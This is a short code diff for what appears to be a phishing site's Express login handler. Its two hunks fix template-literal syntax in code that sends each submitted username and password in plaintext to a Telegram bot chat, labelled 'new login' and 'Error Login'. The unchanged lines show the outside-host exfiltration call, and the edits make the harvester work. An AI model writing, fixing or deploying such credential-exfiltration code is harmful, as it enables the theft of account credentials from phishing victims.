@@ -48,7 +48,7 @@ app.post("/login", async (req, res) => {
       const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=-1002614062462`;
       const telegramMessage = {
         chat_id: CHAT_ID,
-        text: ✅ Error Login:\n👤 Username: ${username}\n🔑 Password: ${password},
+        text: `✅ Error Login:\n👤 Username: ${username}\n🔑 Password: ${password}`,
       };
 
       await fetch(telegramUrl, {
@@ -68,7 +68,7 @@ app.post("/login", async (req, res) => {
     const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=-1002614062462`;
     const telegramMessage = {
       chat_id: CHAT_ID,
-      text: ✅ Новый логин:\n👤 Username: ${username}\n🔑 Password: ${password},
+      text: `✅ Новый логин:\n👤 Username: ${username}\n🔑 Password: ${password}`,
     };
 
     try {
